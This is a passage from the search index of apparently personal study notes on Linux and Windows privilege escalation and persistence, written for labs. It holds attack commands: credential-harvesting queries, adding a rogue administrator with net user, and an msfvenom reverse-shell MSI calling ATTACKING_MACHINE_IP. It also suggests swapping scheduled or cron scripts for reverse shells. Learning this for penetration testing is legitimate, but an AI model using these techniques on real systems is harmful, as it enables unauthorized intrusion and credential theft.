<code>looking for opportunities to gain access to a user account</code>. Some exploits will also allow you to add your own account. In particular something like <code>Dirty C0w</code> or a writeable <code>/etc/shadow</code> or <code>/etc/passwd</code> would quickly give you SSH access to the machine, assuming SSH is open.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#system-info","title":"System info","text":"<p>Note: any file containing system information <code>can be customized or changed</code>.</p> <ul> <li><code>hostname</code>: This value can easily be changed or have a relatively meaningless string BUT, in unedited cases it can provide some info about a system's role inside of a network.</li> </ul> <p>Example: <code>SQL-PROD-01</code> for a SQL production server.</p> <ul> <li><code>uname -a</code>: Additional details about the kernel used by the system. Useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.</li> <li><code>/proc/version</code>: Provides information about the target system processes. May give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.</li> <li><code>/etc/issue</code> &amp; <code>lsb_release -a</code>: Operating system information can also be identified by looking at the /etc/issue file.</li> <li><code>ps</code>: Process Statis will output running processes.</li> <li><code>PID</code>: The process ID (unique to the process)</li> <li><code>TTY</code>: Terminal type used by the user</li> <li><code>Time</code>: Amount of CPU time used by the process (this is NOT the time this process has been running for)</li> <li><code>CMD</code>: The command or executable running (will NOT display any command line parameter)</li> </ul> <p>The \u201cps\u201d command provides a few useful options:   - <code>ps -A</code>: View all running processes   - <code>ps axjf</code>: View process tree   - <code>ps aux</code>: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities. - <code>systemctl list-units --type=service</code>: Lists systemctl services. - <code>env</code>: Show environmental variables, The <code>PATH</code> variable <code>may have a compiler or a scripting language</code> (e.g. Python) that could be used to run code on the target system. - <code>sudo -l</code>: List all commands your user can run using sudo. - <code>ls -la</code>: Remember to always use the ls command with the <code>-la</code> parameter as it shows hidden files.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#user-info","title":"User info","text":"<ul> <li><code>whoami</code>: Shows the user you are using.</li> <li><code>Id</code>: General overview of the user\u2019s privilege level and group memberships.</li> <li><code>groups</code>: Lists the groups.</li> <li><code>/etc/passwd</code>: discover users on the system. The output can be long and a bit intimidating but it can easily be cut and converted to a useful list for brute-force attacks.</li> </ul> <p>Remember that this will return all users, some of which are <code>system or service users</code> that would not be very useful. Another approach could be to <code>grep | home</code> as real users will most likely have their folders under the \u201chome\u201d directory.</p> <ul> <li><code>history</code>: Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.</li> </ul>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#network","title":"Network","text":"<ul> <li><code>ifconfig</code>: The target system <code>may be a pivoting point to another network</code>. The ifconfig command will give us information about the <code>network interfaces of the system</code>.</li> </ul> <p>Example: Our attacking machine can reach the <code>eth0</code> interface but can not directly access the two other networks. This can be confirmed using the <code>ip route</code> command to see which network routes exist. - <code>netstat</code>: The netstat command can be used with several different options to gather information on <code>existing connections</code>.   - <code>netstat -a</code>: shows all <code>listening ports</code> and <code>established connections</code>.   - <code>netstat -at</code> or <code>netstat -au</code>: list TCP or UDP protocols respectively.   - <code>netstat -l</code>: list ports in \u201clistening\u201d mode.   - <code>netstat -lt</code>: list TCP ports in \u201clistening\u201d mode.   - <code>netstat -s</code>: list network usage statistics by protocol. This can also be used with the <code>-t</code> or <code>-u</code> options to limit the output to a specific protocol.   - <code>netstat -tp</code>: list connections with the service name and PID information. This can also be used with the <code>-l</code> option to list listening ports.   - <code>netstat -i</code>: Show inteface statistics.   - <code>netstat -ano</code>: <code>-a</code>: Display all sockets, <code>-n</code>: Do not resolve names &amp; <code>-o</code>: Display timers.   - <code>netstat -tuln</code>: Show open ports. - <code>ss -tuln</code>: List active connections.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#find-command","title":"Find command","text":"<p>Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in <code>find</code> command is useful and worth keeping in your arsenal.</p> <ul> <li><code>find . -name flag1.txt</code>: find the file named \u201cflag1.txt\u201d in the current directory</li> <li><code>find /home -name flag1.txt</code>: find the file names \u201cflag1.txt\u201d in the /home directory</li> <li><code>find / -type d -name config</code>: find the directory named config under \u201c/\u201d</li> <li><code>find / -type f -perm 0777</code>: find files with the 777 permissions (files readable, writable, and executable by all users)</li> <li><code>find / -perm a=x</code>: find executable files</li> <li><code>find /home -user frank</code>: find all files for user \u201cfrank\u201d under \u201c/home\u201d</li> <li><code>find / -mtime 10</code>: find files that were modified in the last 10 days</li> <li><code>find / -atime 10</code>: find files that were accessed in the last 10 day</li> <li><code>find / -cmin -60</code>: find files changed within the last hour (60 minutes)</li> <li><code>find / -amin -60</code>: find files accesses within the last hour (60 minutes)</li> <li><code>find / -size 50M</code>: find files with a 50 MB size</li> </ul> <p>This command can also be used with <code>(+)</code> and <code>(-)</code> signs to specify a file that is larger or smaller than the given size.</p> <p>Folders and files that can be written to or executed from: - <code>find / -writable -type d 2&gt;/dev/null</code>: Find world-writeable folders - <code>find / -perm -222 -type d 2&gt;/dev/null</code>: Find world-writeable folders - <code>find / -perm -o w -type d 2&gt;/dev/null</code>: Find world-writeable folders - <code>find / -perm -o x -type d 2&gt;/dev/null</code>: Find world-executable folders</p> <p>The reason we see three different \u201cfind\u201d commands that could potentially lead to the same result can be seen in the manual document.</p> <p>Find development tools and supported languages: - <code>find / -name perl*</code> - <code>find / -name python*</code> - <code>find / -name gcc*</code></p> <p>Find specific file permissions: Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of <code>the account that owns it, rather than the account which runs it</code>. This allows for an interesting privilege escalation.</p> <ul> <li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.</li> </ul>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#general-linux-command","title":"General linux command","text":"<p>As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as <code>find</code>, <code>less</code>, <code>locate</code>, <code>grep</code>, <code>cut</code>, <code>sort</code>, etc.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#automated-enumeration-tools","title":"Automated Enumeration Tools","text":"<p>Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors: - <code>LinPeas</code> - <code>LinEnum</code> - <code>LES (Linux Exploit Suggester)</code> - <code>Linux Smart Enumeration</code> - <code>Linux Priv Checker</code></p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#kernel-exploits","title":"Kernel exploits","text":"<p>The kernel on Linux systems <code>manages the communication between components such as the memory on the system and applications</code>. This critical function <code>requires the kernel to have specific privileges</code>; thus, a successful exploit will potentially lead to root privileges.</p> <p>A failed kernel exploit can lead to a system crash.</p> <p>The Kernel exploit methodology is simple; 1. Identify the kernel version 2. Search and find an exploit code for the kernel version of the target system 3. Run the exploit</p> <p>Research sources: 1. Based on your findings, you can use Google to search for an existing exploit code. 2. Sources such as <code>cvedetails</code> can also be useful. 3. Another alternative would be to use a script like <code>LES (Linux Exploit Suggester)</code> but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).</p> <p>Hints/Notes: 1. Being too specific about the kernel version when searching for exploits on <code>Google</code>, <code>Exploit-db</code>, or <code>searchsploit</code> 2. Be sure you understand how the exploit code works BEFORE you launch it. <code>Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system</code>, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement. 3. Some exploits <code>may require further interaction</code> once they are run. Read all comments and instructions provided with the exploit code. 4. You can transfer the exploit code from your machine to the target system using the <code>SimpleHTTPServer Python module</code> and <code>wget</code> respectively.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#sudo","title":"Sudo","text":"<p>The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges.</p> <p>Any user can check its current situation related to root privileges using the <code>sudo -l</code> command.</p> <p><code>GTFObins</code> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.</p> <p>Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server. n this case, we can use a \"hack\" to leak information leveraging a function of the application. As Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).</p> <p>Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#suid","title":"SUID","text":"<p>Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with <code>SUID (Set-user Identification)</code> and <code>SGID (Set-group Identification)</code>. These <code>allow files to be executed with the permission level of the file owner or the group owner</code>, respectively.</p> <p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> will list files that have SUID or SGID bits set.</p> <p>A good practice would be to compare <code>executables</code> on this list with <code>GTFOBins</code>. Clicking on the <code>SUID</code> button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list ).</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#capabilities","title":"Capabilities","text":"<p>Another method system administrators can use to increase the privilege level of a process or binary is \u201cCapabilities\u201d. Capabilities <code>help manage privileges at a more granular level</code>. We can use the <code>getcap</code> tool to list enabled capabilities.</p> <p>For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can <code>change the capabilities of the binary</code>. As a result, the binary would get through its task without needing a higher privilege user.</p> <p>When run as an unprivileged user, <code>getcap -r / will generate a huge amount of errors</code>, so it is good practice to <code>redirect the error messages to /dev/null</code>. We do this by using <code>getcap -r / 2&gt;/dev/null</code>.</p> <p><code>GTFObins</code> has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#cron-jobs","title":"Cron Jobs","text":"<p><code>Cron jobs</code> are used to <code>run scripts or binaries at specific times</code>. By default, they <code>run with the privilege of their owners</code> and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.</p> <p>The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.</p> <p>Cron job configurations are stored as <code>crontabs</code> (cron tables) to see the next time and date the task will run.</p> <p><code>Each user on the system have their crontab file</code> and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to <code>find a cron job set by root and have it run our script</code>, ideally a shell.</p> <p>Any user can read the <code>system-wide file keeping</code> cron jobs under <code>/etc/crontab</code></p> <p>Basically, rewrite the script you find with something like a reverse shell in there and make sure it's executeable using: <code>chmod +x &lt;filename&gt;</code>.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#path","title":"PATH","text":"<p>If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. <code>PATH</code> in Linux is an <code>environmental variable</code> that <code>tells the operating system where to search for executables</code>. For any <code>command that is not built into the shell</code> or that is <code>not defined with an absolute path</code>, Linux will start searching in folders defined under PATH.</p> <p>E.g: If we type <code>python</code> in the command line, the operating system will start searching in the paths defined in <code>echo $PATH</code> for the python binary.</p> <p>Typically the PATH will look like this: <code>echo $PATH</code>. To find the path of the program we could use: <code>where &lt;program_name&gt;</code>.</p> <p>As you will see, <code>this depends entirely on the existing configuration of the target system</code>, so be sure you can answer the questions: - What folders are located under $PATH - Does your current user have write privileges for any of these folders? - Can you modify $PATH? - Is there a script/application you can start that will be affected by this vulnerability?</p> <p>If any writable folder is listed under PATH we could create a binary named <code>example</code> under that directory and have our \u201cpath\u201d script run it. As the <code>SUID</code> bit is set, this <code>binary will run with root privilege</code>.</p> <p>A simple search for writable folders can done using: -  <code>find / -writable 2&gt;/dev/null</code>: all writeable folders -  <code>find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2 | sort -u</code>: cut and sorted -  <code>find / -writable 2&gt;/dev/null | grep usr | cut -d \"/\" -f 2,3 | sort -u</code>: targeting a folder like <code>/usr</code>. -  <code>find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u</code>: ridden of many results related to running processes</p> <p>We can also add a folder to the path like so: <code>export PATH=/tmp:$PATH</code>.</p> <p>PATH vulnerability example:</p> <p>You can <code>add the writable directory to your user's PATH</code> and <code>create a file named \"somename\"</code> that the \"./test\" executable will read. The \"somename\" <code>file can simply be a \"cat\" command that will read the flag file</code>.</p>"},{"location":"Cybersecurity/Maintaining%20Access/LinPrivesc/#nfs","title":"NFS","text":"<p>Privilege escalation vectors are not confined to internal access. <code>Shared folders and remote management interfaces</code> such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user\u2019s privilege level.</p> <p>Another vector that is more relevant to CTFs and exams is a <code>misconfigured network shell</code>. This vector can sometimes be seen during penetration testing engagements when a <code>network backup system is present</code>.</p> <p><code>NFS</code> (Network File Sharing) configuration is kept in the <code>/etc/exports</code> file. This file is created during the NFS server installation and can usually be read by users.</p> <p>Start by enumerating mountable shares: 1. <code>showmount -e &lt;MACHINE_IP&gt;</code> 2. <code>mkdir /tmp/backupsonattackermachine</code> 3. <code>mount -o rw &lt;MACHINE_IP&gt;:/backups /tmp/backupsonattackermachine</code> 4. As we can set <code>SUID</code> bits, a simple executable that will run <code>/bin/bash</code> on the target system will do the job. 5. On the target system execute the executable.</p> <p>Quick summary: - Kernel has high priveledges -&gt; exploit - Sudo priveledges on binaries / programs -&gt; gtfobins - SUID files are executable by the owner or group owner -&gt; gtfobins - Capabilities are partly priveledges on binaries -&gt; gtfobins?? - Cron jobs are autorun scripts -&gt; modify root scripts (to a shell) - PATH </p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPersistence/","title":"Windows persistence","text":""},{"location":"Cybersecurity/Maintaining%20Access/WinPersistence/#introduction","title":"Introduction","text":"<p>After gaining the first foothold on your target's internal network, you'll want to ensure you <code>don't lose access</code> to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to <code>creating alternate ways to regain access to a host without going through the exploitation phase all over again</code>.</p> <p>There are many reasons why you'd want to establish persistence as quick as possible, including:</p> <ul> <li>Re-exploitation isn't always possible</li> <li>Gaining a foothold is hard to reproduce</li> <li>The blue team is after you</li> </ul>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/","title":"Priveledge escalation","text":"<p>Ok, we have a shell. Now what? Most shells tend to be unstable and non-interactive. Time to exploit of a vulnerability, design flaw, or configuration oversight in an operating system or application to <code>gain unauthorized access</code> to resources that are usually restricted from the users.</p> <p>On Windows the options are often more limited. It's sometimes possible to find passwords for <code>running services in the registry</code>. <code>VNC servers</code>, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the <code>FileZilla FTP server</code> also leave credentials in an XML file at <code>C:\\Program Files\\FileZilla Server\\FileZilla Server.xml</code>  or <code>C:\\xampp\\FileZilla Server\\FileZilla Server.xml</code>. These can be <code>MD5 hashes</code> or in plaintext, depending on the version.</p> <p>Ideally on Windows you would obtain a shell running as the <code>SYSTEM user</code>, or an <code>administrator account</code> running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over <code>RDP</code>, <code>telnet</code>, <code>winexe</code>, <code>psexec</code>, <code>WinRM</code> or any number of other methods, dependent on the services running on the box.</p> <p>The syntax for this is as follows: - <code>net user &lt;username&gt; &lt;password&gt; /add</code> - <code>net localgroup administrators &lt;username&gt; /add</code></p> <p>Simply put, privilege escalation consists of using given access to a host with \"user A\" and leveraging it to gain access to \"user B\" by abusing a weakness in the target system.</p> <p>Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses: - Misconfigurations on Windows services or scheduled tasks - Excessive privileges assigned to our account - Vulnerable software - Missing Windows security patches</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#account-types","title":"Account types","text":"Type Description User accounts - Administrators These users have the most privileges. They can change any system configuration parameter and access any file in the system. Any user with administrative privileges will be part of the <code>Administrators group</code>. Standard Users These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. Part of the <code>Users group</code>. OS / built-in accounts - SYSTEM / LocalSystem Used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. Local Service Default account used to run Windows services with \"minimum\" privileges. It will use anonymous connections over the network. Network Service Default account used to run Windows services with \"minimum\" privileges. It will use the computer credentials to authenticate through the network. <p>These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#credential-harvesting-from-usual-spots","title":"Credential harvesting from usual spots","text":"<p>The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#unattended","title":"Unattended","text":"<p>When installing Windows on a large number of hosts, administrators may use <code>Windows Deployment Services</code>, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are <code>referred to as unattended installations</code> as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations: - <code>C:\\Unattend.xml</code> - <code>C:\\Windows\\Panther\\Unattend.xml</code> - <code>C:\\Windows\\Panther\\Unattend\\Unattend.xml</code> - <code>C:\\Windows\\system32\\sysprep.inf</code> - <code>C:\\Windows\\system32\\sysprep\\sysprep.xml</code></p> <pre><code>As part of these files, you might encounter credentials:\n```xml\n&lt;Credentials&gt;\n    &lt;Username&gt;Administrator&lt;/Username&gt;\n    &lt;Domain&gt;thm.local&lt;/Domain&gt;\n    &lt;Password&gt;MyPassword123&lt;/Password&gt;\n&lt;/Credentials&gt;\n```\n</code></pre>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#powershell-history","title":"Powershell history","text":"<p>If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a <code>cmd.exe</code> prompt:</p> <p><code>type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt</code></p> <p>Note: The command above will only work from cmd.exe, as Powershell won't recognize <code>%userprofile%</code> as an environment variable. To read the file from Powershell, you'd have to replace <code>%userprofile%</code> with <code>$Env:userprofile</code>.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#save-windows-credentials","title":"Save Windows Credentials","text":"<p>Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials: <code>cmdkey /list</code>.</p> <p>While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the <code>runas</code> command and the <code>/savecred</code> option: <code>runas /savecred /user:admin cmd.exe</code>.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#iis-configuration-internet-information-services","title":"IIS Configuration (Internet Information Services)","text":"<p>This is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations: - <code>C:\\inetpub\\wwwroot\\web.config</code> - <code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config</code></p> <p>Here is a quick way to find database connection strings on the file: <code>type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString</code>.</p> <p>Output may look like: <pre><code>&lt;connectionStrings&gt;\n    &lt;add connectionString=\"Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3\" name=\"THM-DB\" /&gt;\n&lt;/connectionStrings&gt;\n</code></pre></p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#retrieve-credentials-from-software-putty","title":"Retrieve Credentials from Software: PuTTY","text":"<p>PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.</p> <p>To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command: <code>reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s</code>.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#other-quick-wins","title":"Other quick wins","text":""},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#scheduled-tasks-windowss-cronjobs","title":"Scheduled tasks (Windows's cronjobs)","text":"<p>Look for a scheduled task that either lost its binary or a binary you can modify. Scheduled tasks can be listed from the command line using the <code>schtasks</code> command without any options.</p> <p>To retrieve detailed information about any of the services, you can use a command like: <code>schtasks /query /tn vulntask /fo list /v</code>. You will get lots of information about the task, but what matters for us is the <code>Task to Run</code> parameter which indicates what gets executed by the scheduled task, and the <code>Run As User</code> parameter, which shows the user that will be used to execute the task.</p> <p>Example output:</p> <pre><code>Folder: \\\nHostName:                             WPRIVESC1\nTaskName:                             \\vulntask\nNext Run Time:                        N/A\nStatus:                               Ready\nLogon Mode:                           Interactive/Background\nLast Run Time:                        1/21/2025 9:48:47 PM\nLast Result:                          0\nAuthor:                               WPRIVESC1\\Administrator\nTask To Run:                          C:\\tasks\\schtask.bat\nStart In:                             N/A\nComment:                              N/A\nScheduled Task State:                 Enabled\nIdle Time:                            Disabled\nPower Management:                     Stop On Battery Mode, No Start On Batteries\nRun As User:                          taskusr1\nDelete Task If Not Rescheduled:       Disabled\nStop Task If Runs X Hours and X Mins: 72:00:00\nSchedule:                             Scheduling data is not available in this format.\nSchedule Type:                        At system start up\nStart Time:                           N/A\nStart Date:                           N/A\nEnd Date:                             N/A\nDays:                                 N/A\nMonths:                               N/A\nRepeat: Every:                        N/A\nRepeat: Until: Time:                  N/A\nRepeat: Until: Duration:              N/A\nRepeat: Stop If Still Running:        N/A\n</code></pre> <p>If our current user can modify or overwrite the <code>Task to Run</code> executable, we can control what gets executed by the user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use <code>icacls</code> like so: <code>icacls c:\\tasks\\schtask.bat</code>.</p> <p>Example output:</p> <pre><code>c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F)\n                    BUILTIN\\Administrators:(I)(F)\n                    BUILTIN\\Users:(I)(F)\n</code></pre> <p>As can be seen in the result, the <code>BUILTIN\\Users</code> group has <code>full access (F)</code> over the task's binary. This means we can modify the .bat file and insert any payload we like. All that's left to do is change the bat file to spawn a reverse shell.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#alwaysinstallelevated-msi-files-run-with-elevated-privileges","title":"AlwaysInstallElevated (.msi files run with elevated privileges)","text":"<p>Windows installer files (also known as <code>.msi</code> files) are used to install applications on the system and usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.</p> <p>This method <code>requires two registry values to be set</code>. You can query these from the command line using the commands below. - <code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</code> - <code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</code></p> <p>If these are set, you can generate a malicious .msi file using msfvenom:</p> <p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</code></p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#abusing-service-misconfigurations","title":"Abusing Service Misconfigurations","text":""},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#what-are-windows-services","title":"What are Windows Services?","text":"<ul> <li>Services are <code>background processes that run without user interaction</code>.</li> <li>They <code>often start automatically</code> and <code>run with system-level privileges</code> (e.g., LocalSystem, LocalService, or NetworkService accounts).</li> <li>Misconfigured services can allow attackers to escalate privileges by abusing their properties.</li> </ul> <p>Windows services are managed by the <code>Service Control Manager (SCM)</code>. The SCM is a process in charge of managing the state of services as needed, <code>checking the current status of any given service</code> and generally <code>providing a way to configure services</code>. Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that <code>service executables implement special functions</code> to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. <code>Each service also specifies the user account under which the service will run</code>. To better understand the structure of a service, let's check the apphostsvc service configuration with the <code>sc qc</code> command:</p> <pre><code>[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: apphostsvc\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\system32\\svchost.exe -k apphost\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Application Host Helper Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : localSystem\n</code></pre> <p>Here we can see that the associated executable is specified through the <code>BINARY_PATH_NAME</code> parameter, and the account used to run the service is shown on the <code>SERVICE_START_NAME</code> parameter.</p> <p>Services have a <code>Discretionary Access Control List</code> or <code>DACL</code>, which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):</p> <p></p> <p>All of the services configurations are stored on the registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\</code>:</p> <p></p> <p>A subkey exists for every service in the system. Again, we can see the associated executable on the <code>ImagePath</code> value and the account used to start the service on the <code>ObjectName</code> value. If a DACL has been configured for the service, it will be stored in a subkey called <code>Security</code>. As you have guessed by now, only administrators can modify such registry entries by default.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#insecure-permissions-on-service-executable","title":"Insecure Permissions on Service Executable","text":"<p>This vulnerability arises when the executable file of a service is <code>stored in a location with weak permissions</code>, allowing unauthorized users to replace it with a malicious file.</p> <p>To recap: if the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.</p> <p>To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler.</p> <p>Example: 1. To start, we will query the service configuration using <code>sc</code>. 2. We can see that the service installed by the vulnerable software runs as <code>.\\svcuser1</code> and the executable associated with the service is in <code>C:\\Progra~2\\System~1\\WService.exe</code>. 3. We then proceed to check the permissions on the executable: And here we have something interesting. The <code>Everyone</code> group has <code>modify permissions (M)</code> on the service's executable. 4. Generate an exe-service payload using msfvenom and serve it through a python webserver. 5. Once the payload is in the Windows server, we proceed to replace the service executable with our payload. 6. Since we need another user to execute our payload, we'll want to grant <code>full permissions to the Everyone group</code> as well. 7. We start a reverse listener on our attacker machine. 8. And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use <code>sc stop windowsscheduler</code> and then <code>sc start windowsscheduler</code>.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#unquoted-service-paths","title":"Unquoted Service Paths","text":"<p>When we can't directly write into service executables as before, there might still be a chance to <code>force a service into running arbitrary executables</code> by using a rather obscure feature. When working with Windows services, a very particular behaviour occurs when the service is configured to point to an <code>unquoted executable</code>. By unquoted, we mean that the <code>path of the associated executable isn't properly quoted to account for spaces on the command</code>.</p> <p>As an example, let's look at the difference between two services:</p> <ul> <li><code>BINARY_PATH_NAME   : \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" -service</code>, quoted.</li> <li><code>BINARY_PATH_NAME   : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>, unquoted.</li> </ul> <p>When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the \"Disk Sorter Enterprise\" folder, the command becomes <code>ambiguous</code>, and the SCM doesn't know which of the following you are trying to execute:</p> Command Argument 1 Argument 2 <code>C:\\MyPrograms\\Disk.exe</code> <code>Sorter</code> <code>Enterprise\\bin\\disksrs.exe</code> <code>C:\\MyPrograms\\Disk Sorter.exe</code> <code>Enterprise\\bin\\disksrs.exe</code> <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> <p>This has to do with how the command prompt parses a command. Usually, when you send a command, <code>spaces are used as argument separators</code> unless they are part of a quoted string. This means the \"right\" interpretation of the unquoted command would be to execute <code>C:\\\\MyPrograms\\\\Disk.exe</code> and take the rest as arguments.</p> <p>Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:</p> <ol> <li>First, search for <code>C:\\\\MyPrograms\\\\Disk.exe</code>. If it exists, the service will run this executable.</li> <li>If the latter doesn't exist, it will then search for <code>C:\\\\MyPrograms\\\\Disk Sorter.exe</code>. If it exists, the service will run this executable.</li> <li>If the latter doesn't exist, it will then search for <code>C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe</code>. This option is expected to succeed and will typically be run in a default installation.</li> </ol> <p>From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable. While this sounds trivial, most of the service executables will be installed under <code>C:\\Program Files</code> or <code>C:\\Program Files (x86)</code> by default, which <code>isn't writable by unprivileged users</code>.</p>"},{"location":"Cybersecurity/Maintaining%20Access/WinPrivesc/#insecure-service-permissions","title":"Insecure Service Permissions","text":"<p>You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the <code>service DACL</code> (<code>not the service's 